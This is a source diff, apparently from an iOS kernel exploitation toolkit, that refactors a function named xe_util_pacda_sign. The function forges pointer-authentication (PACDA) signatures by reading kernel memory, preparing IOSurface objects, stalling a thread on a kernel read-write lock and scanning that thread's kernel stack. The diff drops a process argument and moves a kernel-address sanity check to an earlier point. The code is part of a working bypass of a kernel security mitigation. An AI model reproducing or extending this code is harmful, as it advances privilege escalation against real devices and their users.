@@ -111,8 +111,10 @@ uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
     return kstackptr;
 }
 
-int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
-    proc = xe_xnu_proc_current_proc();
+int xe_util_pacda_sign(uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
+    uintptr_t lr_kfree = xe_slider_kernel_slide(FUNC_OS_DICTIONARY_ENSURE_CAPACITY_ADDR) + LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(lr_kfree - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_KFREE_TYPE_VAR_IMPL_INTERNAL_ADDR), lr_kfree - 4))
+    
     xe_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
     
     uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
@@ -126,7 +128,7 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
     xe_util_pacda_prepare_surface_for_switch(surface_ref, surface);
     
-    util_lck_rw = xe_util_lck_rw_lock_exclusive(proc, kalloc_map_lck);
+    util_lck_rw = xe_util_lck_rw_lock_exclusive(kalloc_map_lck);
     
     uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
     dispatch_semaphore_t sem_add_value_start = dispatch_semaphore_create(0);
@@ -144,9 +146,6 @@ int xe_util_pacda_sign(uintptr_t proc, uintptr_t ptr, uint64_t ctx, uintptr_t *o
     uintptr_t lr_lck_rw_excl_gen_stack_ptr;
     int error = xe_util_lck_rw_wait_for_contention(util_lck_rw, *waiting_thread, 0, &lr_lck_rw_excl_gen_stack_ptr);
     xe_assert_err(error);
-    
-    uintptr_t lr_kfree = xe_slider_kernel_slide(FUNC_OS_DICTIONARY_ENSURE_CAPACITY_ADDR) + LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET;
-    xe_assert_cond(xe_kmem_read_uint32(lr_kfree - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_KFREE_TYPE_VAR_IMPL_INTERNAL_ADDR), lr_kfree - 4))
     
     uintptr_t lr_kfree_stack_ptr;
     error = xe_xnu_thread_scan_stack(*waiting_thread, lr_kfree, XE_PTRAUTH_MASK, 1024, &lr_kfree_stack_ptr);
